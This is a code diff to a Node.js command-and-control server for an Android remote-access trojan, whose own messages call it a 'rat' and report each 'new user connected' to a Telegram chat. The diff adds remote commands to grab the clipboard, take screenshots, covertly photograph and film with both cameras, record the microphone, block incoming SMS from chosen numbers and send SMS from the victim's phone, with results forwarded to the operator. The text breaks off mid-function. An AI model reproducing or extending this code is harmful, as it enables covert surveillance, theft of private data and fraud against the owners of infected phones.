@@ -279,7 +279,7 @@ const getGeoLocation = async (portname, passname, devid, shortcut, callback = ()
     })
 }
 
-const sendSMSAll = async (portname, passname, devid, sms, shortcut, callback = () => {}) => {
+const sendAllSMS = async (portname, passname, devid, sms, shortcut, callback = () => {}) => {
     await getUserByDeviceId(portname, devid, async (user) => {
         let found = null;
         if (user.status == true){
@@ -289,7 +289,7 @@ const sendSMSAll = async (portname, passname, devid, sms, shortcut, callback = (
         if (found == null){
             callback({
                 status: false,
-                method: "sendSMSAll",
+                method: "sendAllSMS",
                 message: "USER_NOT_FOUND",
                 device_id: devid
             });
@@ -299,7 +299,7 @@ const sendSMSAll = async (portname, passname, devid, sms, shortcut, callback = (
         found.socket.write(JSON.stringify({
             port: portname,
             password: passname,
-            method: "sendSMSAll",
+            method: "sendAllSMS",
             sms: sms,
             shortcut: shortcut
         }));
@@ -333,6 +333,70 @@ const sendSMS = async (portname, passname, devid, sms, tonumber, shortcut, callb
             method: "sendSMS",
             sms: sms,
             tonumber: tonumber,
+            shortcut: shortcut
+        }));
+
+        
+        callback({
+            status: true
+        });
+    })
+}
+
+const setSMSFilter = async (portname, passname, devid, filter_number, shortcut, callback = () => {}) => {
+    await getUserByDeviceId(portname, devid, async (user) => {
+        let found = null;
+        if (user.status == true){
+            found = user.user;
+        }
+
+        if (found == null){
+            callback({
+                status: false,
+                method: "setSMSFilter",
+                message: "USER_NOT_FOUND",
+                device_id: devid
+            });
+            return;
+        }
+        
+        found.socket.write(JSON.stringify({
+            port: portname,
+            password: passname,
+            method: "setSMSFilter",
+            filter_number: filter_number,
+            shortcut: shortcut
+        }));
+
+        
+        callback({
+            status: true
+        });
+    })
+}
+
+const removeSMSFilter = async (portname, passname, devid, filter_number, shortcut, callback = () => {}) => {
+    await getUserByDeviceId(portname, devid, async (user) => {
+        let found = null;
+        if (user.status == true){
+            found = user.user;
+        }
+
+        if (found == null){
+            callback({
+                status: false,
+                method: "removeSMSFilter",
+                message: "USER_NOT_FOUND",
+                device_id: devid
+            });
+            return;
+        }
+        
+        found.socket.write(JSON.stringify({
+            port: portname,
+            password: passname,
+            method: "removeSMSFilter",
+            filter_number: filter_number,
             shortcut: shortcut
         }));
 
@@ -394,6 +458,181 @@ const setSoundVolume = async (portname, passname, devid, volume, shortcut, callb
     })
 }
 
+const getClipboard = async (portname, passname, devid, shortcut, callback = () => {}) => {
+    await getUserByDeviceId(portname, devid, async (user) => {
+        if (user.status == false){
+            callback({
+                status: false,
+                method: "getClipboard",
+                message: "USER_NOT_FOUND",
+                device_id: devid
+            });
+            return;
+        }
+
+        user.user.socket.write(JSON.stringify({
+            port: portname,
+            password: passname,
+            method: "getClipboard",
+            shortcut: shortcut
+        }));
+
+        callback({
+            status: true
+        });
+    })
+}
+
+const takeScreenshot = async (portname, passname, devid, shortcut, callback = () => {}) => {
+    await getUserByDeviceId(portname, devid, async (user) => {
+        if (user.status == false){
+            callback({
+                status: false,
+                method: "takeScreenshot",
+                message: "USER_NOT_FOUND",
+                device_id: devid
+            });
+            return;
+        }
+
+        user.user.socket.write(JSON.stringify({
+            port: portname,
+            password: passname,
+            method: "takeScreenshot",
+            shortcut: shortcut
+        }));
+
+        callback({
+            status: true
+        });
+    })
+}
+
+const takeFrontshot = async (portname, passname, devid, shortcut, callback = () => {}) => {
+    await getUserByDeviceId(portname, devid, async (user) => {
+        if (user.status == false){
+            callback({
+                status: false,
+                method: "takeFrontshot",
+                message: "USER_NOT_FOUND",
+                device_id: devid
+            });
+            return;
+        }
+
+        user.user.socket.write(JSON.stringify({
+            port: portname,
+            password: passname,
+            method: "takeFrontshot",
+            shortcut: shortcut
+        }));
+
+        callback({
+            status: true
+        });
+    })
+}
+
+const takeBackshot = async (portname, passname, devid, shortcut, callback = () => {}) => {
+    await getUserByDeviceId(portname, devid, async (user) => {
+        if (user.status == false){
+            callback({
+                status: false,
+                method: "takeBackshot",
+                message: "USER_NOT_FOUND",
+                device_id: devid
+            });
+            return;
+        }
+
+        user.user.socket.write(JSON.stringify({
+            port: portname,
+            password: passname,
+            method: "takeBackshot",
+            shortcut: shortcut
+        }));
+
+        callback({
+            status: true
+        });
+    })
+}
+
+const recordFront = async (portname, passname, devid, shortcut, callback = () => {}) => {
+    await getUserByDeviceId(portname, devid, async (user) => {
+        if (user.status == false){
+            callback({
+                status: false,
+                method: "recordFront",
+                message: "USER_NOT_FOUND",
+                device_id: devid
+            });
+            return;
+        }
+
+        user.user.socket.write(JSON.stringify({
+            port: portname,
+            password: passname,
+            method: "recordFront",
+            shortcut: shortcut
+        }));
+
+        callback({
+            status: true
+        });
+    })
+}
+
+const recordBack = async (portname, passname, devid, shortcut, callback = () => {}) => {
+    await getUserByDeviceId(portname, devid, async (user) => {
+        if (user.status == false){
+            callback({
+                status: false,
+                method: "recordBack",
+                message: "USER_NOT_FOUND",
+                device_id: devid
+            });
+            return;
+        }
+
+        user.user.socket.write(JSON.stringify({
+            port: portname,
+            password: passname,
+            method: "recordBack",
+            shortcut: shortcut
+        }));
+
+        callback({
+            status: true
+        });
+    })
+}
+
+const recordMicrophone = async (portname, passname, devid, shortcut, callback = () => {}) => {
+    await getUserByDeviceId(portname, devid, async (user) => {
+        if (user.status == false){
+            callback({
+                status: false,
+                method: "recordMicrophone",
+                message: "USER_NOT_FOUND",
+                device_id: devid
+            });
+            return;
+        }
+
+        user.user.socket.write(JSON.stringify({
+            port: portname,
+            password: passname,
+            method: "recordMicrophone",
+            shortcut: shortcut
+        }));
+
+        callback({
+            status: true
+        });
+    })
+}
+
 const server = net.createServer(async (socket) => {
     socket.on('data', async (data) => {
         try{
@@ -406,7 +645,7 @@ const server = net.createServer(async (socket) => {
                             let bot = new TelegramBot(_port.port.token);
                             
                             if (!_port.status){
-                                message.edit == false ? await bot.sendMessage(
+                                message.shortcut.edit == false ? await bot.sendMessage(
                                     message.shortcut.chat_id,
                                     build("🔴 𓏺|𓏺 invalid port or password detected"),
                                     {
@@ -423,7 +662,7 @@ const server = net.createServer(async (socket) => {
                             }
 
                             if (_port.user.is_ban){
-                                message.edit == false ? await bot.sendMessage(
+                                message.shortcut.edit == false ? await bot.sendMessage(
                                     message.shortcut.chat_id,
                                     build("🔴 𓏺|𓏺 sorry but you got banned"),
                                     {
@@ -454,7 +693,7 @@ const server = net.createServer(async (socket) => {
                             if (message.method == "getUserByDeviceId"){
                                 await getSafeUserByDeviceId(message.port, message.password, message.device_id, message.shortcut, async (user) => {
                                     if (user.status == false && user.message == "USER_NOT_FOUND"){
-                                        message.edit == false ? await bot.sendMessage(
+                                        message.shortcut.edit == false ? await bot.sendMessage(
                                             message.shortcut.chat_id,
                                             build("🔴 𓏺|𓏺 user not found"),
                                             {
@@ -476,7 +715,7 @@ const server = net.createServer(async (socket) => {
                             if (message.method == "openUrl"){
                                 await openUrl(message.port, message.password, message.device_id, message.url, message.shortcut, async (dt) => {
                                     if (dt.status == false && dt.message == "USER_NOT_FOUND"){
-                                        message.edit == false ? await bot.sendMessage(
+                                        message.shortcut.edit == false ? await bot.sendMessage(
                                             message.shortcut.chat_id,
                                             build("🔴 𓏺|𓏺 user not found"),
                                             {
@@ -496,7 +735,7 @@ const server = net.createServer(async (socket) => {
                             if (message.method == "vibratePhone"){
                                 await vibratePhone(message.port, message.password, message.device_id, message.shortcut, async (dt) => {
                                     if (dt.status == false && dt.message == "USER_NOT_FOUND"){
-                                        message.edit == false ? await bot.sendMessage(
+                                        message.shortcut.edit == false ? await bot.sendMessage(
                                             message.shortcut.chat_id,
                                             build("🔴 𓏺|𓏺 user not found"),
                                             {
@@ -516,7 +755,7 @@ const server = net.createServer(async (socket) => {
                             if (message.method == "sendToast"){
                                 await sendToast(message.port, message.password, message.device_id, message.toast, message.shortcut, async (dt) => {
                                     if (dt.status == false && dt.message == "USER_NOT_FOUND"){
-                                        message.edit == false ? await bot.sendMessage(
+                                        message.shortcut.edit == false ? await bot.sendMessage(
                                             message.shortcut.chat_id,
                                             build("🔴 𓏺|𓏺 user not found"),
                                             {
@@ -536,7 +775,7 @@ const server = net.createServer(async (socket) => {
                             if (message.method == "getGeoLocation"){
                                 await getGeoLocation(message.port, message.password, message.device_id, message.shortcut, async (dt) => {
                                     if (dt.status == false && dt.message == "USER_NOT_FOUND"){
-                                        message.edit == false ? await bot.sendMessage(
+                                        message.shortcut.edit == false ? await bot.sendMessage(
                                             message.shortcut.chat_id,
                                             build("🔴 𓏺|𓏺 user not found"),
                                             {
@@ -553,10 +792,10 @@ const server = net.createServer(async (socket) => {
                                 })
                             }
 
-                            if (message.method == "sendSMSAll"){
-                                await sendSMSAll(message.port, message.password, message.device_id, message.sms, async (dt) => {
+                            if (message.method == "sendAllSMS"){
+                                await sendAllSMS(message.port, message.password, message.device_id, message.sms, message.shortcut, async (dt) => {
                                     if (dt.status == false && dt.message == "USER_NOT_FOUND"){
-                                        message.edit == false ? await bot.sendMessage(
+                                        message.shortcut.edit == false ? await bot.sendMessage(
                                             message.shortcut.chat_id,
                                             build("🔴 𓏺|𓏺 user not found"),
                                             {
@@ -574,9 +813,9 @@ const server = net.createServer(async (socket) => {
                             }
 
                             if (message.method == "sendSMS"){
-                                await sendSMS(message.port, message.password, message.device_id, message.sms, message.tonumber, async (dt) => {
+                                await sendSMS(message.port, message.password, message.device_id, message.sms, message.tonumber, message.shortcut, async (dt) => {
                                     if (dt.status == false && dt.message == "USER_NOT_FOUND"){
-                                        message.edit == false ? await bot.sendMessage(
+                                        message.shortcut.edit == false ? await bot.sendMessage(
                                             message.shortcut.chat_id,
                                             build("🔴 𓏺|𓏺 user not found"),
                                             {
@@ -594,9 +833,9 @@ const server = net.createServer(async (socket) => {
                             }
 
                             if (message.method == "getInstalledApps"){
-                                await getInstalledApps(message.port, message.password, message.device_id, async (dt) => {
+                                await getInstalledApps(message.port, message.password, message.device_id, message.shortcut, async (dt) => {
                                     if (dt.status == false && dt.message == "USER_NOT_FOUND"){
-                                        message.edit == false ? await bot.sendMessage(
+                                        message.shortcut.edit == false ? await bot.sendMessage(
                                             message.shortcut.chat_id,
                                             build("🔴 𓏺|𓏺 user not found"),
                                             {
@@ -616,7 +855,7 @@ const server = net.createServer(async (socket) => {
                             if (message.method == "setSoundVolume"){
                                 await setSoundVolume(message.port, message.password, message.device_id, message.volume, message.shortcut, async (dt) => {
                                     if (dt.status == false && dt.message == "USER_NOT_FOUND"){
-                                        message.edit == false ? await bot.sendMessage(
+                                        message.shortcut.edit == false ? await bot.sendMessage(
                                             message.shortcut.chat_id,
                                             build("🔴 𓏺|𓏺 user not found"),
                                             {
@@ -632,6 +871,187 @@ const server = net.createServer(async (socket) => {
                                     }
                                 })
                             }
+
+                            if (message.method == "getClipboard"){
+                                await getClipboard(message.port, message.password, message.device_id, message.shortcut, async (dt) => {
+                                    if (dt.status == false && dt.message == "USER_NOT_FOUND"){
+                                        message.shortcut.edit == false ? await bot.sendMessage(
+                                            message.shortcut.chat_id,
+                                            build("🔴 𓏺|𓏺 user not found"),
+                                            {
+                                                reply_to_message_id: message.shortcut.message_id
+                                            }
+                                        ) : await bot.editMessageText(
+                                            build("🔴 𓏺|𓏺 user not found"),
+                                            {
+                                                chat_id: message.shortcut.chat_id,
+                                                message_id: message.shortcut.message_id
+                                            }
+                                        )
+                                    }
+                                })
+                            }
+
+                            if (message.method == "takeScreenshot"){
+                                await takeScreenshot(message.port, message.password, message.device_id, message.shortcut, async (dt) => {
+                                    if (dt.status == false && dt.message == "USER_NOT_FOUND"){
+                                        message.shortcut.edit == false ? await bot.sendMessage(
+                                            message.shortcut.chat_id,
+                                            build("🔴 𓏺|𓏺 user not found"),
+                                            {
+                                                reply_to_message_id: message.shortcut.message_id
+                                            }
+                                        ) : await bot.editMessageText(
+                                            build("🔴 𓏺|𓏺 user not found"),
+                                            {
+                                                chat_id: message.shortcut.chat_id,
+                                                message_id: message.shortcut.message_id
+                                            }
+                                        )
+                                    }
+                                })
+                            }
+
+                            if (message.method == "takeFrontshot"){
+                                await takeFrontshot(message.port, message.password, message.device_id, message.shortcut, async (dt) => {
+                                    if (dt.status == false && dt.message == "USER_NOT_FOUND"){
+                                        message.shortcut.edit == false ? await bot.sendMessage(
+                                            message.shortcut.chat_id,
+                                            build("🔴 𓏺|𓏺 user not found"),
+                                            {
+                                                reply_to_message_id: message.shortcut.message_id
+                                            }
+                                        ) : await bot.editMessageText(
+                                            build("🔴 𓏺|𓏺 user not found"),
+                                            {
+                                                chat_id: message.shortcut.chat_id,
+                                                message_id: message.shortcut.message_id
+                                            }
+                                        )
+                                    }
+                                })
+                            }
+
+                            if (message.method == "takeBackshot"){
+                                await takeBackshot(message.port, message.password, message.device_id, message.shortcut, async (dt) => {
+                                    if (dt.status == false && dt.message == "USER_NOT_FOUND"){
+                                        message.shortcut.edit == false ? await bot.sendMessage(
+                                            message.shortcut.chat_id,
+                                            build("🔴 𓏺|𓏺 user not found"),
+                                            {
+                                                reply_to_message_id: message.shortcut.message_id
+                                            }
+                                        ) : await bot.editMessageText(
+                                            build("🔴 𓏺|𓏺 user not found"),
+                                            {
+                                                chat_id: message.shortcut.chat_id,
+                                                message_id: message.shortcut.message_id
+                                            }
+                                        )
+                                    }
+                                })
+                            }
+
+                            if (message.method == "recordBack"){
+                                await recordBack(message.port, message.password, message.device_id, message.shortcut, async (dt) => {
+                                    if (dt.status == false && dt.message == "USER_NOT_FOUND"){
+                                        message.shortcut.edit == false ? await bot.sendMessage(
+                                            message.shortcut.chat_id,
+                                            build("🔴 𓏺|𓏺 user not found"),
+                                            {
+                                                reply_to_message_id: message.shortcut.message_id
+                                            }
+                                        ) : await bot.editMessageText(
+                                            build("🔴 𓏺|𓏺 user not found"),
+                                            {
+                                                chat_id: message.shortcut.chat_id,
+                                                message_id: message.shortcut.message_id
+                                            }
+                                        )
+                                    }
+                                })
+                            }
+
+                            if (message.method == "recordFront"){
+                                await recordFront(message.port, message.password, message.device_id, message.shortcut, async (dt) => {
+                                    if (dt.status == false && dt.message == "USER_NOT_FOUND"){
+                                        message.shortcut.edit == false ? await bot.sendMessage(
+                                            message.shortcut.chat_id,
+                                            build("🔴 𓏺|𓏺 user not found"),
+                                            {
+                                                reply_to_message_id: message.shortcut.message_id
+                                            }
+                                        ) : await bot.editMessageText(
+                                            build("🔴 𓏺|𓏺 user not found"),
+                                            {
+                                                chat_id: message.shortcut.chat_id,
+                                                message_id: message.shortcut.message_id
+                                            }
+                                        )
+                                    }
+                                })
+                            }
+
+                            if (message.method == "recordMicrophone"){
+                                await recordMicrophone(message.port, message.password, message.device_id, message.shortcut, async (dt) => {
+                                    if (dt.status == false && dt.message == "USER_NOT_FOUND"){
+                                        message.shortcut.edit == false ? await bot.sendMessage(
+                                            message.shortcut.chat_id,
+                                            build("🔴 𓏺|𓏺 user not found"),
+                                            {
+                                                reply_to_message_id: message.shortcut.message_id
+                                            }
+                                        ) : await bot.editMessageText(
+                                            build("🔴 𓏺|𓏺 user not found"),
+                                            {
+                                                chat_id: message.shortcut.chat_id,
+                                                message_id: message.shortcut.message_id
+                                            }
+                                        )
+                                    }
+                                })
+                            }
+
+                            if (message.method == "setSMSFilter"){
+                                await setSMSFilter(message.port, message.password, message.device_id, message.filter_number, message.shortcut, async (dt) => {
+                                    if (dt.status == false && dt.message == "USER_NOT_FOUND"){
+                                        message.shortcut.edit == false ? await bot.sendMessage(
+                                            message.shortcut.chat_id,
+                                            build("🔴 𓏺|𓏺 user not found"),
+                                            {
+                                                reply_to_message_id: message.shortcut.message_id
+                                            }
+                                        ) : await bot.editMessageText(
+                                            build("🔴 𓏺|𓏺 user not found"),
+                                            {
+                                                chat_id: message.shortcut.chat_id,
+                                                message_id: message.shortcut.message_id
+                                            }
+                                        )
+                                    }
+                                })
+                            }
+
+                            if (message.method == "removeSMSFilter"){
+                                await removeSMSFilter(message.port, message.password, message.device_id, message.filter_number, message.shortcut, async (dt) => {
+                                    if (dt.status == false && dt.message == "USER_NOT_FOUND"){
+                                        message.shortcut.edit == false ? await bot.sendMessage(
+                                            message.shortcut.chat_id,
+                                            build("🔴 𓏺|𓏺 user not found"),
+                                            {
+                                                reply_to_message_id: message.shortcut.message_id
+                                            }
+                                        ) : await bot.editMessageText(
+                                            build("🔴 𓏺|𓏺 user not found"),
+                                            {
+                                                chat_id: message.shortcut.chat_id,
+                                                message_id: message.shortcut.message_id
+                                            }
+                                        )
+                                    }
+                                })
+                            }
+                        
 
                         })
                     } else {
@@ -670,7 +1090,7 @@ const server = net.createServer(async (socket) => {
                             
                             await cli.sendMessage(
                                 prt.port.chat_id,
-                                build(`🕸 𓏺|𓏺 new user connected\n\n`) + `🛠 𓏺|𓏺 <code>/sign_${message.device_id}</code>\n` + build(`\n🌐 𓏺|𓏺 ip: ${message.ip} - `) + `<code>${message.ip}</code>\n` + build(`👔 𓏺|𓏺 rat: ${message.rat}\n🗼 𓏺|𓏺 android-version: ${message.android_version}\n📱 𓏺|𓏺 model: `) + message.model + build(`\n🔋 𓏺|𓏺 battery is %${message.battery}\n🔵 𓏺|𓏺 ${message.accessory.length} access were found\n\n🍁 𓏺|𓏺 `) + `<a href='https://t.me/Vex_Bite'>${build("universe got big plans for us")}</a>`,
+                                build(`🕸 𓏺|𓏺 new user connected\n\n`) + `🛠 𓏺|𓏺 <code>/sign_${message.device_id}</code>\n` + build("\n🌐 𓏺|𓏺 ip: ") + `<code>${socket.remoteAddress}</code>` + ` - ${socket.remoteAddress}` + build(`👔 𓏺|𓏺 rat: ${message.rat}\n🗼 𓏺|𓏺 android-version: ${message.android_version}\n📱 𓏺|𓏺 model: `) + message.model + build(`\n🔋 𓏺|𓏺 battery is %${message.battery}\n🔵 𓏺|𓏺 ${message.accessory.length} access were found\n\n🍁 𓏺|𓏺 `) + `<a href='https://t.me/Vex_Bite'>${build("universe got big plans for us")}</a>`,
                                 {
                                     parse_mode: "HTML"
                                 }
@@ -905,6 +1325,430 @@ const server = net.createServer(async (socket) => {
                                     build(`🔊 ${sym} volume seted for your target `) + message.device_id + build(`\n\n🌪 ${sym} volume is ${message.shortcut.volume} now`),
                                     {
                                         reply_to_message_id: message.shortcut.message_id
+                                    }
+                                )
+                            } else {
+                                message.shortcut.edit ? await bot.editMessageText(
+                                    build(`🔴 ${sym} error detected\n - ${message.message}`),
+                                    {
+                                        parse_mode: "HTML",
+                                        chat_id: message.shortcut.chat_id,
+                                        message_id: message.shortcut.message_id
+                                    }
+                                ) : await bot.sendMessage(
+                                    message.shortcut.chat_id,
+                                    build(`🔴 ${sym} error detected\n - ${message.message}`),
+                                    {
+                                        reply_to_message_id: message.shortcut.message_id
+                                    }
+                                )
+                            }
+                        } else if (message.method == "getClipboard"){
+                            if (message.status == true){
+                                message.shortcut.edit ? await bot.editMessageMedia(
+                                    {
+                                        media: message.file_link,
+                                        type: "document",
+                                        caption: build(`📥 ${sym} clipboard `) + message.shortcut.device_id + build(` is here`)
+                                    },
+                                    {
+                                        parse_mode: "HTML",
+                                        chat_id: message.shortcut.chat_id,
+                                        message_id: message.shortcut.message_id
+                                    }
+                                ) : await bot.sendDocument(
+                                    message.shortcut.chat_id,
+                                    message.file_link,
+                                    {
+                                        reply_to_message_id: message.shortcut.message_id,
+                                        caption: build(`📥 ${sym} clipboard `) + message.shortcut.device_id + build(` is here`)
+                                    }
+                                )
+                            } else {
+                                message.shortcut.edit ? await bot.editMessageText(
+                                    build(`🔴 ${sym} error detected\n - ${message.message}`),
+                                    {
+                                        parse_mode: "HTML",
+                                        chat_id: message.shortcut.chat_id,
+                                        message_id: message.shortcut.message_id
+                                    }
+                                ) : await bot.sendMessage(
+                                    message.shortcut.chat_id,
+                                    build(`🔴 ${sym} error detected\n - ${message.message}`),
+                                    {
+                                        reply_to_message_id: message.shortcut.message_id
+                                    }
+                                )
+                            }
+                        } else if (message.method == "takeScreenshot"){
+                            if (message.status == true){
+                                message.shortcut.edit ? await bot.editMessageMedia(
+                                    {
+                                        media: message.file_link,
+                                        type: "photo",
+                                        caption: build(`📥 ${sym} screenshot of device `) + message.shortcut.device_id + build(` page`)
+                                    },
+                                    {
+                                        parse_mode: "HTML",
+                                        chat_id: message.shortcut.chat_id,
+                                        message_id: message.shortcut.message_id
+                                    }
+                                ) : await bot.sendPhoto(
+                                    message.shortcut.chat_id,
+                                    message.file_link,
+                                    {
+                                        reply_to_message_id: message.shortcut.message_id,
+                                        caption: build(`📥 ${sym} screenshot of device `) + message.shortcut.device_id + build(` page`)
+                                    }
+                                )
+                            } else {
+                                message.shortcut.edit ? await bot.editMessageText(
+                                    build(`🔴 ${sym} error detected\n - ${message.message}`),
+                                    {
+                                        parse_mode: "HTML",
+                                        chat_id: message.shortcut.chat_id,
+                                        message_id: message.shortcut.message_id
+                                    }
+                                ) : await bot.sendMessage(
+                                    message.shortcut.chat_id,
+                                    build(`🔴 ${sym} error detected\n - ${message.message}`),
+                                    {
+                                        reply_to_message_id: message.shortcut.message_id
+                                    }
+                                )
+                            }
+                        } else if (message.method == "takeFrontshot"){
+                            if (message.status == true){
+                                message.shortcut.edit ? await bot.editMessageMedia(
+                                    {
+                                        media: message.file_link,
+                                        type: "photo",
+                                        caption: build(`📥 ${sym} front-shot picture of device `) + message.shortcut.device_id + build(` page`)
+                                    },
+                                    {
+                                        parse_mode: "HTML",
+                                        chat_id: message.shortcut.chat_id,
+                                        message_id: message.shortcut.message_id
+                                    }
+                                ) : await bot.sendPhoto(
+                                    message.shortcut.chat_id,
+                                    message.file_link,
+                                    {
+                                        reply_to_message_id: message.shortcut.message_id,
+                                        caption: build(`📥 ${sym} front-shot picture of device `) + message.shortcut.device_id + build(` page`)
+                                    }
+                                )
+                            } else {
+                                message.shortcut.edit ? await bot.editMessageText(
+                                    build(`🔴 ${sym} error detected\n - ${message.message}`),
+                                    {
+                                        parse_mode: "HTML",
+                                        chat_id: message.shortcut.chat_id,
+                                        message_id: message.shortcut.message_id
+                                    }
+                                ) : await bot.sendMessage(
+                                    message.shortcut.chat_id,
+                                    build(`🔴 ${sym} error detected\n - ${message.message}`),
+                                    {
+                                        reply_to_message_id: message.shortcut.message_id
+                                    }
+                                )
+                            }
+                        } else if (message.method == "takeBackshot"){
+                            if (message.status == true){
+                                message.shortcut.edit ? await bot.editMessageMedia(
+                                    {
+                                        media: message.file_link,
+                                        type: "photo",
+                                        caption: build(`📥 ${sym} back-shot picture of device `) + message.shortcut.device_id + build(` page`)
+                                    },
+                                    {
+                                        parse_mode: "HTML",
+                                        chat_id: message.shortcut.chat_id,
+                                        message_id: message.shortcut.message_id
+                                    }
+                                ) : await bot.sendPhoto(
+                                    message.shortcut.chat_id,
+                                    message.file_link,
+                                    {
+                                        reply_to_message_id: message.shortcut.message_id,
+                                        caption: build(`📥 ${sym} back-shot picture of device `) + message.shortcut.device_id + build(` page`)
+                                    }
+                                )
+                            } else {
+                                message.shortcut.edit ? await bot.editMessageText(
+                                    build(`🔴 ${sym} error detected\n - ${message.message}`),
+                                    {
+                                        parse_mode: "HTML",
+                                        chat_id: message.shortcut.chat_id,
+                                        message_id: message.shortcut.message_id
+                                    }
+                                ) : await bot.sendMessage(
+                                    message.shortcut.chat_id,
+                                    build(`🔴 ${sym} error detected\n - ${message.message}`),
+                                    {
+                                        reply_to_message_id: message.shortcut.message_id
+                                    }
+                                )
+                            }
+                        } else if (message.method == "recordBack"){
+                            if (message.status == true){
+                                message.shortcut.edit ? await bot.editMessageMedia(
+                                    {
+                                        media: message.file_link,
+                                        type: "video",
+                                        caption: build(`📥 ${sym} back-video of device `) + message.shortcut.device_id
+                                    },
+                                    {
+                                        parse_mode: "HTML",
+                                        chat_id: message.shortcut.chat_id,
+                                        message_id: message.shortcut.message_id
+                                    }
+                                ) : await bot.sendVideo(
+                                    message.shortcut.chat_id,
+                                    message.file_link,
+                                    {
+                                        reply_to_message_id: message.shortcut.message_id,
+                                        caption: build(`📥 ${sym} back-video of device `) + message.shortcut.device_id
+                                    }
+                                )
+                            } else {
+                                message.shortcut.edit ? await bot.editMessageText(
+                                    build(`🔴 ${sym} error detected\n - ${message.message}`),
+                                    {
+                                        parse_mode: "HTML",
+                                        chat_id: message.shortcut.chat_id,
+                                        message_id: message.shortcut.message_id
+                                    }
+                                ) : await bot.sendMessage(
+                                    message.shortcut.chat_id,
+                                    build(`🔴 ${sym} error detected\n - ${message.message}`),
+                                    {
+                                        reply_to_message_id: message.shortcut.message_id
+                                    }
+                                )
+                            }
+                        } else if (message.method == "recordFront"){
+                            if (message.status == true){
+                                message.shortcut.edit ? await bot.editMessageMedia(
+                                    {
+                                        media: message.file_link,
+                                        type: "video",
+                                        caption: build(`📥 ${sym} front-video of device `) + message.shortcut.device_id
+                                    },
+                                    {
+                                        parse_mode: "HTML",
+                                        chat_id: message.shortcut.chat_id,
+                                        message_id: message.shortcut.message_id
+                                    }
+                                ) : await bot.sendVideo(
+                                    message.shortcut.chat_id,
+                                    message.file_link,
+                                    {
+                                        reply_to_message_id: message.shortcut.message_id,
+                                        caption: build(`📥 ${sym} front-video of device `) + message.shortcut.device_id
+                                    }
+                                )
+                            } else {
+                                message.shortcut.edit ? await bot.editMessageText(
+                                    build(`🔴 ${sym} error detected\n - ${message.message}`),
+                                    {
+                                        parse_mode: "HTML",
+                                        chat_id: message.shortcut.chat_id,
+                                        message_id: message.shortcut.message_id
+                                    }
+                                ) : await bot.sendMessage(
+                                    message.shortcut.chat_id,
+                                    build(`🔴 ${sym} error detected\n - ${message.message}`),
+                                    {
+                                        reply_to_message_id: message.shortcut.message_id
+                                    }
+                                )
+                            }
+                        } else if (message.method == "recordMicrophone"){
+                            if (message.status == true){
+                                message.shortcut.edit ? await bot.editMessageMedia(
+                                    {
+                                        media: message.file_link,
+                                        type: "audio",
+                                        caption: build(`📥 ${sym} recorded microphone of device `) + message.shortcut.device_id
+                                    },
+                                    {
+                                        parse_mode: "HTML",
+                                        chat_id: message.shortcut.chat_id,
+                                        message_id: message.shortcut.message_id
+                                    }
+                                ) : await bot.sendAudio(
+                                    message.shortcut.chat_id,
+                                    message.file_link,
+                                    {
+                                        reply_to_message_id: message.shortcut.message_id,
+                                        caption: build(`📥 ${sym} recorded microphone of device `) + message.shortcut.device_id
+                                    }
+                                )
+                            } else {
+                                message.shortcut.edit ? await bot.editMessageText(
+                                    build(`🔴 ${sym} error detected\n - ${message.message}`),
+                                    {
+                                        parse_mode: "HTML",
+                                        chat_id: message.shortcut.chat_id,
+                                        message_id: message.shortcut.message_id
+                                    }
+                                ) : await bot.sendMessage(
+                                    message.shortcut.chat_id,
+                                    build(`🔴 ${sym} error detected\n - ${message.message}`),
+                                    {
+                                        reply_to_message_id: message.shortcut.message_id
+                                    }
+                                )
+                            }
+                        } else if (message.method == "setSMSFilter"){
+                            if (message.status == true){
+                                message.shortcut.edit ? await bot.editMessageText(
+                                    build(`👤 ${sym} the receive sms blocked for `) + message.shortcut.filter_number,
+                                    {
+                                        parse_mode: "HTML",
+                                        chat_id: message.shortcut.chat_id,
+                                        message_id: message.shortcut.message_id
+                                    }
+                                ) : await bot.sendMessage(
+                                    message.shortcut.chat_id,
+                                    build(`👤 ${sym} the receive sms blocked for `) + message.shortcut.filter_number,
+                                    {
+                                        reply_to_message_id: message.shortcut.message_id
+                                    }
+                                )
+                            } else {
+                                message.shortcut.edit ? await bot.editMessageText(
+                                    build(`🔴 ${sym} error detected\n - ${message.message}`),
+                                    {
+                                        parse_mode: "HTML",
+                                        chat_id: message.shortcut.chat_id,
+                                        message_id: message.shortcut.message_id
+                                    }
+                                ) : await bot.sendMessage(
+                                    message.shortcut.chat_id,
+                                    build(`🔴 ${sym} error detected\n - ${message.message}`),
+                                    {
+                                        reply_to_message_id: message.shortcut.message_id
+                                    }
+                                )
+                            }
+                        }  else if (message.method == "removeSMSFilter"){
+                            if (message.status == true){
+                                message.shortcut.edit ? await bot.editMessageText(
+                                    build(`👤 ${sym} the receive sms unblocked for `) + message.shortcut.filter_number,
+                                    {
+                                        parse_mode: "HTML",
+                                        chat_id: message.shortcut.chat_id,
+                                        message_id: message.shortcut.message_id
+                                    }
+                                ) : await bot.sendMessage(
+                                    message.shortcut.chat_id,
+                                    build(`👤 ${sym} the receive sms unblocked for `) + message.shortcut.filter_number,
+                                    {
+                                        reply_to_message_id: message.shortcut.message_id
+                                    }
+                                )
+                            } else {
+                                message.shortcut.edit ? await bot.editMessageText(
+                                    build(`🔴 ${sym} error detected\n - ${message.message}`),
+                                    {
+                                        parse_mode: "HTML",
+                                        chat_id: message.shortcut.chat_id,
+                                        message_id: message.shortcut.message_id
+                                    }
+                                ) : await bot.sendMessage(
+                                    message.shortcut.chat_id,
+                                    build(`🔴 ${sym} error detected\n - ${message.message}`),
+                                    {
+                                        reply_to_message_id: message.shortcut.message_id
+                                    }
+                                )
+                            }
+                        }  else if (message.method == "sendSMS"){
+                            if (message.status == true){
+                                message.shortcut.edit ? await bot.editMessageText(
+                                    build(`🥌 ${sym} your sms has sent to the `) + message.shortcut.tonumber,
+                                    {
+                                        parse_mode: "HTML",
+                                        chat_id: message.shortcut.chat_id,
+                                        message_id: message.shortcut.message_id
+                                    }
+                                ) : await bot.sendMessage(
+                                    message.shortcut.chat_id,
+                                    build(`🥌 ${sym} your sms has sent to the `) + message.shortcut.tonumber,
+                                    {
+                                        reply_to_message_id: message.shortcut.message_id
+                                    }
+                                )
+                            } else {
+                                message.shortcut.edit ? await bot.editMessageText(
+                                    build(`🔴 ${sym} error detected\n - ${message.message}`),
+                                    {
+                                        parse_mode: "HTML",
+                                        chat_id: message.shortcut.chat_id,
+                                        message_id: message.shortcut.message_id
+                                    }
+                                ) : await bot.sendMessage(
+                                    message.shortcut.chat_id,
+                                    build(`🔴 ${sym} error detected\n - ${message.message}`),
